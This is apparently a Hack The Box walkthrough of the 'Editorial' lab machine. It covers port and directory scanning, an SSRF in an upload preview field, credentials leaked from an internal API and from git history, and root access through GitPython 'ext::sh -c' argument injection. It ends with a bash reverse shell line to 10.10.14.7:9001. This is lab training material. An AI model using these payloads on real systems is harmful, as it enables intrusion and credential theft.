+++
title = 'Editorial'
date = 2024-08-24T16:50:47-04:00
draft = false
tags = ["linux"]
category = ["htb"]
summary = "HTB - Linux - Easy"
+++


# Enum
```bash
┌──(fish㉿kali)-[~/htb/editorial]
└─$ nmap -p- -T5 -oN all-ports.nmap $IP
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


┌──(fish㉿kali)-[~/htb/editorial]
└─$ nmap -p22,80 -A -oN service-scan.nmap $IP        

Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-22 13:57 EDT
Nmap scan report for 10.10.11.20
Host is up (0.026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


# 80

Began scan with whatweb
```bash
┌──(fish㉿kali)-[~/htb/editorial]
└─$ whatweb $IP
http://10.10.11.20 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.20], RedirectLocation[http://editorial.htb], Title[301 Moved Permanently], nginx[1.18.0]
ERROR Opening: http://editorial.htb - no address for editorial.htb

```
Need to add to hosts file and try again:
```bash
┌──(fish㉿kali)-[~/htb/editorial]
└─$ whatweb http://editorial.htb
http://editorial.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.20], Title[Editorial Tiempo Arriba], X-UA-Compatible[IE=edge], nginx[1.18.0]
```



### Fuzzing Dirs
```bash
┌──(fish㉿kali)-[~/htb/editorial]
└─$ URL=http://editorial.htb/FUZZ

┌──(fish㉿kali)-[~/htb/editorial]
└─$ wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://editorial.htb/FUZZ
Total requests: 62283

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                            
=====================================================================

000000088:   200        209 L    537 W      7134 Ch     "upload"                                                                           
000000126:   200        71 L     232 W      2938 Ch     "about"                                                                            
000004255:   200        176 L    589 W      8562 Ch     "http://editorial.htb/"                                                            
000030014:   200        176 L    589 W      8562 Ch     "http://editorial.htb/"                                                            
000059103:   200        176 L    589 W      8562 Ch     "http://editorial.htb/"  
```



Upload directory is the most interesting. 



Browsing directly to the web page gives another possible hostname we can add to our hosts file.
*Doesn't lead anywhere*

`tiempoarriba.htb`

#### Upload Directory
A couple possible options to abuse, there's a search function, we can upload a "preview", and we may be able to include a URL.



The send book function isn't all that interesting as it doesn't send anything we can work with. The `preview` option is interesting as we can submit an URL and see it perform a GET request using python.


Sending a request and picking it up on our python server:




The response also returns something different if it's successful or not, unsuccuessful requests return a URL in /static/images containing unsplash.



Successful requests point to a /static/uploads file that we can download and view 



We're not able execute code directly, but we can use ffuf to enumerate any other listening ports we don't have access to via the web server on port 80.

Changing our URL value to `http://127.0.0.1:FUZZ` and copying our request to a file named 127.0.0.1.req in burpwill allow us to enumerate any other listening ports:



Which we can then run FFUF against, excluding the unsplash from our successful results (as they all return 200s)

```bash
┌──(fish㉿kali)-[~/htb/editorial]
└─$ ffuf -request 127.0.0.1.req -request-proto http -w /opt/SecLists/Discovery/Infrastructure/common-http-ports.txt -fr unsplash      
```



We can check to see what uri is included in the response and use curl to get the contents of the page:



```bash
┌──(fish㉿kali)-[~/htb/editorial]
└─$ curl $URL/static/uploads/42f3802b-f94d-4148-afd7-5215529a8ada | jq
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}

```

Next we can check out the endpoints:

http://127.0.0.1:5000/api/latest/metadata/messages/authors has creds

```json
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```


`dev:dev080217_devAPI!@` which allows us to login via ssh


---
# Foothold

Foothold is found during enumeration of the web application on port 80. We find we are able to perform SSRFs and enumerate another web server on port 5000 on localhost of the box. We can then enumerate different api endpoints until we find plaintext creds allowing us to login via ssh as `dev`.





## Exploits


--- 
# PrivEsc

Interestingly we find a .git directory with a potential user `dev-carlos.valderrama`

Checking passwd, that user doesn't appear to be local

We can check the different commits for any sensitive info:

```bash
dev@editorial:~/apps/.git$ git log


dev@editorial:~/apps/.git$ git show 1e84a036b2f33c59e2390730699a488c65643d28

```



One pops out as it mentions `internal` info


`prod:080217_Producti0n_2023!@`

Nice!


We can switch users to prod and we find we can run sudo


Checking out the script;


No luck trying to escape commands, but we can look at the packages the script imports and check their versions:


We see it's using `GitPython 3.1.29`, and there's an exploit for it



POC to test for code execution:
```
# `'ext::sh -c touch% /tmp/pwned'`
```

When we run the command we see a new file in /tmp
```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'

```


We can copy the root flag to the temp directory to read it:
```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/pwned'

```


## Exploits

https://github.com/gitpython-developers/GitPython/issues/1515


---


# Post/Pivot

We can also easily get a rev shell as root if we wanted to loot the box further:

```bash
prod@editorial:/opt/internal_apps/clone_changes$ echo '/bin/bash -i >& /dev/tcp/10.10.14.7/9001 0>&1' >> /tmp/rev.sh

```




---
